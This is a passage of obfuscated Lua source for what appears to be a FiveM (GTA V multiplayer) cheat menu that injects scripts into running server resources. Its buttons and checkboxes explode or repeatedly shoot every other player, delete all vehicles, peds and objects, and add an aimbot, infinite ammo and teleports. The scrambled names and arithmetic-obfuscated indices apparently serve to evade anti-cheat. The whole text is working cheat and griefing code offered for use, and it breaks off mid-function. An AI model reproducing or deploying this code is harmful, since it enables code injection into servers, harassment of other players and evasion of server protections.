            ]]);end);MachoMenuButton(v39[4 -2 ],"Cone Everyone",function() local v208=0 -0 ;local v209;local v210;local v211;while true do if (v208==(1076 -(1036 + 37))) then for v330,v331 in ipairs(GetActivePlayers()) do v210(GetPlayerPed(v331));end v211=(GetGamePool and GetGamePool("CPed")) or {} ;v208=3 + 1 ;end if (v208==2) then function v210(v332) local v333=0 -0 ;local v334;local v335;local v336;while true do if (v333==3) then SetEntityCanBeDamaged(v335,false);v336=GetPedBoneIndex(v332,24454 + 6632 );v333=1484 -(641 + 839) ;end if (v333==(917 -(910 + 3))) then AttachEntityToEntity(v335,v332,v336,0,0 -0 ,1684.25 -(1466 + 218) ,0 + 0 ,1148 -(556 + 592) ,0,false,false,true,false,1 + 1 ,true);break;end if ((810 -(329 + 479))==v333) then SetEntityCollision(v335,false,false);SetEntityInvincible(v335,true);v333=3;end if (v333==(855 -(174 + 680))) then v335=CreateObject(v209,v334.x,v334.y,v334.z,true,true,false);SetEntityAsMissionEntity(v335,true,true);v333=2;end if (v333==(0 -0)) then if ( not DoesEntityExist(v332) or IsEntityDead(v332)) then return;end v334=GetEntityCoords(v332);v333=1 -0 ;end end end v210(PlayerPedId());v208=3;end if (v208==0) then v209=GetHashKey("prop_roadcone02a");RequestModel(v209);v208=1;end if (v208==4) then for v337,v338 in ipairs(v211) do if  not IsPedAPlayer(v338) then v210(v338);end end break;end if (v208==(1 + 0)) then while  not HasModelLoaded(v209) do Wait(0);end v210=nil;v208=2;end end end);MachoMenuButton(v39[741 -(396 + 343) ],"Explode All Players",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function fGhJkLpOiUzXcVb()
                    local aSdFgHjKlQwErTy = GetActivePlayers
                    local pOiUyTrEeRwQtYy = DoesEntityExist
                    local mNbVcCxZzLlKkJj = GetEntityCoords
                    local hGjFkDlSaPwOeIr = AddOwnedExplosion
                    local tYuIoPaSdFgHjKl = PlayerPedId

                    local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
                    for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                        local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                        if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                            local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                            hGjFkDlSaPwOeIr(
                                tYuIoPaSdFgHjKl(),
                                nMzXcVbNmQwErTy.x,
                                nMzXcVbNmQwErTy.y,
                                nMzXcVbNmQwErTy.z,
                                6,     -- Explosion type
                                1.0,   -- Damage scale
                                true,  -- Audible
                                false, -- Invisible
                                0.0    -- Camera shake
                            )
                        end
                    end
                end

                fGhJkLpOiUzXcVb()
            ]]);end);MachoMenuButton(v39[1 + 1 ],"Explode All Vehicles",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function uYhGtFrEdWsQaZx()
                    local rTyUiOpAsDfGhJk = GetGamePool
                    local xAsDfGhJkLpOiUz = DoesEntityExist
                    local cVbNmQwErTyUiOp = GetEntityCoords
                    local vBnMkLoPiUyTrEw = AddOwnedExplosion
                    local nMzXcVbNmQwErTy = PlayerPedId

                    local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
                    local me = nMzXcVbNmQwErTy()
                    for _, veh in ipairs(_vehicles) do
                        if xAsDfGhJkLpOiUz(veh) then
                            local pos = cVbNmQwErTyUiOp(veh)
                            vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                        end
                    end
                end
                uYhGtFrEdWsQaZx()
            ]]);end);MachoMenuButton(v39[1479 -(29 + 1448) ],"Delete All Vehicles",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function zXcVbNmQwErTyUi()
                    local aSdFgHjKlQwErTy = GetGamePool
                    local pOiUyTrEeRwQtYy = DoesEntityExist
                    local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
                    local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
                    local tYuIoPaSdFgHjKl = DeleteEntity
                    local yUiOpAsDfGhJkLz = PlayerPedId
                    local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
                    local gJkLoPiUyTrEqWe = GetGameTimer
                    local fDeSwQaZxCvBnMm = Wait

                    local me = yUiOpAsDfGhJkLz()
                    local myVeh = uIoPaSdFgHjKlQw(me, false)

                    local vehicles = aSdFgHjKlQwErTy("CVehicle")
                    for _, veh in ipairs(vehicles) do
                        if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                            mNbVcCxZzLlKkJj(veh)
                            local timeout = gJkLoPiUyTrEqWe() + 500
                            while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                                fDeSwQaZxCvBnMm(0)
                            end
                            if hGjFkDlSaPwOeIr(veh) then
                                tYuIoPaSdFgHjKl(veh)
                            end
                        end
                    end
                end
                zXcVbNmQwErTyUi()
            ]]);end);MachoMenuButton(v39[1391 -(135 + 1254) ],"Delete All Peds",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function qWeRtYuIoPlMnBv()
                    local zXcVbNmQwErTyUi = GetGamePool
                    local aSdFgHjKlQwErTy = DoesEntityExist
                    local pOiUyTrEeRwQtYy = DeleteEntity
                    local mNbVcCxZzLlKkJj = PlayerId
                    local hGjFkDlSaPwOeIr = GetPlayerPed
                    local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
                    local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
                    local uIoPaSdFgHjKlQw = GetGameTimer
                    local gJkLoPiUyTrEqWe = Wait
                    local vBnMkLoPiUyTrEw = IsPedAPlayer

                    local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
                    local peds = zXcVbNmQwErTyUi("CPed")

                    for _, ped in ipairs(peds) do
                        if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                            tYuIoPaSdFgHjKl(ped)
                            local timeout = uIoPaSdFgHjKlQw() + 500
                            while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                                gJkLoPiUyTrEqWe(0)
                            end
                            if yUiOpAsDfGhJkLz(ped) then
                                pOiUyTrEeRwQtYy(ped)
                            end
                        end
                    end
                end
                qWeRtYuIoPlMnBv()
            ]]);end);MachoMenuButton(v39[7 -5 ],"Delete All Objects",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function mNqAzXwSeRdTfGy()
                    local rTyUiOpAsDfGhJk = GetGamePool
                    local xAsDfGhJkLpOiUz = DoesEntityExist
                    local cVbNmQwErTyUiOp = DeleteEntity
                    local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
                    local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
                    local yUiOpAsDfGhJkLz = GetGameTimer
                    local uIoPaSdFgHjKlQw = Wait

                    local objects = rTyUiOpAsDfGhJk("CObject")
                    for _, obj in ipairs(objects) do
                        if xAsDfGhJkLpOiUz(obj) then
                            vBnMkLoPiUyTrEw(obj)
                            local timeout = yUiOpAsDfGhJkLz() + 500
                            while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                                uIoPaSdFgHjKlQw(0)
                            end
                            if nMzXcVbNmQwErTy(obj) then
                                cVbNmQwErTyUiOp(obj)
                            end
                        end
                    end
                end
                mNqAzXwSeRdTfGy()
            ]]);end);MachoMenuButton(v39[2],"ShowIDs [New Feature]",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local displayIDs = false -- toggles both self + nearby IDs

        function DrawText3D(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
            if onScreen then
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.5, 0.5)
                SetTextColour(255, 255, 255, 255)
                SetTextEntry("STRING")
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end

        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(0)

                -- Toggle both IDs with E
                if IsControlJustPressed(0, 38) then
                    displayIDs = not displayIDs
                end

                if displayIDs then
                    -- Draw own ID
                    local playerId = GetPlayerServerId(PlayerId())
                    SetTextFont(0)
                    SetTextProportional(1)
                    SetTextScale(0.3, 0.3)
                    SetTextColour(255, 255, 255, 255)
                    SetTextEntry("STRING")
                    AddTextComponentString("Your Player ID: " .. playerId)
                    DrawText(0.5, 0.1)

                    -- Draw nearby players' IDs
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)
                    local players = GetActivePlayers()

                    for _, player in ipairs(players) do
                        local targetPed = GetPlayerPed(player)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local dist = #(playerCoords - targetCoords)

                            if dist < 40.0 then
                                local targetId = GetPlayerServerId(player)
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                            end
                        end
                    end
                end
            end
        end)
            ]]);end);MachoMenuCheckbox(v39[9 -7 ],"Kill Everyone",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
                aSwDeFgHiJkLoPx = true

                local function pLoMkIjUhbGyTf()
                    local mAxPlErOy = PlayerPedId()
                    local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
                    local gBvTnCuXe = 100
                    local aSdFgHjKl = 1000.0
                    local lKjHgFdSa = 300.0

                    local nBxMzLqPw = CreateThread
                    local qWeRtYuiOp = ShootSingleBulletBetweenCoords

                    nBxMzLqPw(function()
                        while aSwDeFgHiJkLoPx and not Unloaded do
                            Wait(gBvTnCuXe)
                            local bNmZxSwEd = GetActivePlayers()
                            local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                            for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                                local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                                if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                                    local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                                    if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                        local xScVbNmAz = vector3(
                                            eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                            eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                            eDxCfVgBh.z + 1.2
                                        )

                                        local dFgHjKlZx = vector3(
                                            eDxCfVgBh.x,
                                            eDxCfVgBh.y,
                                            eDxCfVgBh.z + 0.2
                                        )

                                        qWeRtYuiOp(
                                            xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                            dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                            aSdFgHjKl,
                                            true,
                                            rVtNiUcEx,
                                            mAxPlErOy,
                                            true,
                                            false,
                                            100.0
                                        )
                                    end
                                end
                            end
                        end
                    end)
                end

                pLoMkIjUhbGyTf()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                aSwDeFgHiJkLoPx = false
            ]]);end);MachoMenuCheckbox(v39[2 + 0 ],"Permanent Kill Everyone",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
                qWeRtYuIoPlMnAb = true

                local function bZxLmNcVqPeTyUi()
                    local vBnMkLoPi = PlayerPedId()
                    local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
                    local eDxCfVgBh = 100
                    local lKjHgFdSa = 1000.0
                    local mAxPlErOy = 300.0

                    local rTwEcVzUi = CreateThread
                    local oPiLyKuJm = ShootSingleBulletBetweenCoords

                    rTwEcVzUi(function()
                        while qWeRtYuIoPlMnAb and not Unloaded do
                            Wait(eDxCfVgBh)
                            local aSdFgHjKl = GetActivePlayers()
                            local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                            for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                                local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                                if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                                    local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                                    if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                        local jUiKoLpMq = vector3(
                                            zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                            zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                            zAsXcVbNm.z + 1.2
                                        )

                                        local cReAtEtHrEaD = vector3(
                                            zAsXcVbNm.x,
                                            zAsXcVbNm.y,
                                            zAsXcVbNm.z + 0.2
                                        )

                                        oPiLyKuJm(
                                            jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                            cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                            lKjHgFdSa,
                                            true,
                                            wQaSzXedC,
                                            vBnMkLoPi,
                                            true,
                                            false,
                                            100.0
                                        )
                                    end
                                end
                            end
                        end
                    end)
                end

                bZxLmNcVqPeTyUi()
            ]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                qWeRtYuIoPlMnAb = false
            ]]);end);local v57=MachoMenuInputbox(v40[1],"Coords:","x, y, z");MachoMenuButton(v40[1528 -(389 + 1138) ],"Teleport to Coords",function() local v212=574 -(102 + 472) ;local v213;while true do if (v212==0) then v213=MachoMenuGetInputbox(v57);if (v213 and (v213~="")) then local v355,v356,v357=v213:match("([^,]+),%s*([^,]+),%s*([^,]+)");v355=tonumber(v355);v356=tonumber(v356);v357=tonumber(v357);if (v355 and v356 and v357) then MachoInjectResource((v47("monitor") and "monitor") or "any" ,string.format([[
                        local function b0NtdqLZKW()
                            local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                            local nHgFdSaZxCvBnMq = PlayerPedId
                            local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                            local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                            local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                            local x, y, z = %f, %f, %f
                            local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                            if found then z = gZ + 1.0 end

                            local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                            uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                        end

                        b0NtdqLZKW()
                    ]],v355,v356,v357));end end break;end end end);MachoMenuButton(v40[1 + 0 ],"Waypoint",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function xQX7uzMNfb()
                    local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
                    local zXcVbNmQwErTyUi = DoesBlipExist
                    local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
                    local lKjHgFdSaPlMnBv = PlayerPedId
                    local qWeRtYuIoPlMnBv = SetEntityCoords

                    local function XcVrTyUiOpAsDfGh()
                        local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                        if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                        return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
                    end

                    local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
                    if GhTyUoLpZmNbVcXq then
                        local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                        qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
                    end
                end

                xQX7uzMNfb()
            ]]);end);MachoMenuButton(v40[1 + 0 ],"FIB Building",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function HAZ6YqLRbM()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 140.43, -750.52, 258.15
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                HAZ6YqLRbM()
            ]]);end);MachoMenuButton(v40[1 + 0 ],"Mission Row PD",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function oypB9FcNwK()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 425.1, -979.5, 30.7
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                oypB9FcNwK()
            ]]);end);MachoMenuButton(v40[1546 -(320 + 1225) ],"Pillbox Hospital",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function TmXU0zLa4e()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 308.6, -595.3, 43.28
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                TmXU0zLa4e()
            ]]);end);MachoMenuButton(v40[1 -0 ],"Del Perro Pier",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function eLQN9XKwbJ()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -1632.87, -1007.81, 13.07
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                eLQN9XKwbJ()
            ]]);end);MachoMenuButton(v40[1 + 0 ],"Grove Street",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function YrAFvPMkqt()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 109.63, -1943.14, 20.80
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                YrAFvPMkqt()
            ]]);end);MachoMenuButton(v40[1465 -(157 + 1307) ],"Legion Square",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function zdVCXL8rjp()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 229.21, -871.61, 30.49
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                zdVCXL8rjp()
            ]]);end);MachoMenuButton(v40[1860 -(821 + 1038) ],"LS Customs",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function oKXpQUYwd5()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -365.4, -131.8, 37.7
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                oKXpQUYwd5()
            ]]);end);MachoMenuButton(v40[2 -1 ],"Maze Bank",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function E1tYUMowqF()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -75.24, -818.95, 326.1
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                E1tYUMowqF()
            ]]);end);MachoMenuButton(v40[1 + 0 ],"Mirror Park",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function Ptn2qMBvYe()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 1039.2, -765.3, 57.9
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                Ptn2qMBvYe()
            ]]);end);MachoMenuButton(v40[1],"Vespucci Beach",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function gQZf7xYULe()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -1223.8, -1516.6, 4.4
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                gQZf7xYULe()
            ]]);end);MachoMenuButton(v40[1],"Vinewood",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function JqXLKbvR20()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 293.2, 180.5, 104.3
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                JqXLKbvR20()
            ]]);end);MachoMenuButton(v40[1 -0 ],"Sandy Shores",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function NxvTpL3qWz()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 1843.10, 3707.60, 33.52
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                NxvTpL3qWz()
            ]]);end);MachoMenuButton(v40[1 + 1 ],"Print Current Coords",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function Xy9TqLzVmN()
                    local zXcVbNmQwErTyUi = GetEntityCoords
                    local aSdFgHjKlQwErTy = PlayerPedId

                    local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
                    local x, y, z = coords.x, coords.y, coords.z
                    print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
                end

                Xy9TqLzVmN()
            ]]);end);MachoMenuCheckbox(v41[2 -1 ],"Delete Gun",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
if DeleteGun == nil then DeleteGun = false end
DeleteGun = true
local function getEntity(player)
local result, entity = GetEntityPlayerIsFreeAimingAt(player)
return entity
end
local function DeleteGunLoop()
local thread = CreateThread
thread(function()
while DeleteGun and not Unloaded do
local gotEntity = getEntity(PlayerId())
if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 0, false, true)
SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 0)
if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
if IsPlayerFreeAiming(PlayerId()) then
if IsEntityAPed(gotEntity) then
if IsPedInAnyVehicle(gotEntity, true) then
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
else
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
end
else
if IsControlJustReleased(1, 142) then
SetEntityAsMissionEntity(gotEntity, 1, 1)
DeleteEntity(gotEntity)
end
end
end
end
end
Wait(0)
end
end)
end
DeleteGunLoop()
]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
DeleteGun = false
]]);end);MachoMenuCheckbox(v41[1],"AimBot [Risky]",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
if aimbot == nil then aimbot = false end
aimbot = true
local function AimBotLoop()
local thread = CreateThread
thread(function()
while aimbot and not Unloaded do
for i = 0, 128 do
if i ~= PlayerId() then
if IsPlayerFreeAiming(PlayerId()) then
local TargetPed = GetPlayerPed(i)
local TargetPos = GetEntityCoords(TargetPed)
local Exist = DoesEntityExist(TargetPed)
local Dead = IsPlayerDead(TargetPed)
if Exist and not Dead then
local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
if IsEntityVisible(TargetPed) and OnScreen then
if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
end
end
end
end
end
end
Wait(0)
end
end)
end
AimBotLoop()
]]);end,function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
aimbot = false
]]);end);MachoMenuCheckbox(v41[1],"Infinite Ammo",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                LkJgFdSaQwErTy = true

                local function qUwKZopRM8()
                    if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                    LkJgFdSaQwErTy = true

                    local MnBvCxZlKjHgFd = CreateThread
                    MnBvCxZlKjHgFd(function()
                        local AsDfGhJkLzXcVb = PlayerPedId
                        local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                        local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                        local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                        local GhJkLzXcVbNmQw = SetPedAmmo

                        while LkJgFdSaQwErTy and not Unloaded do
                            local ped = AsDfGhJkLzXcVb()
                            local weapon = ZxCvBnMqWeRtYu(ped)

                            QwErTyUiOpAsDf(ped, true)

                            if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                                GhJkLzXcVbNmQw(ped, weapon, 250)
                            end

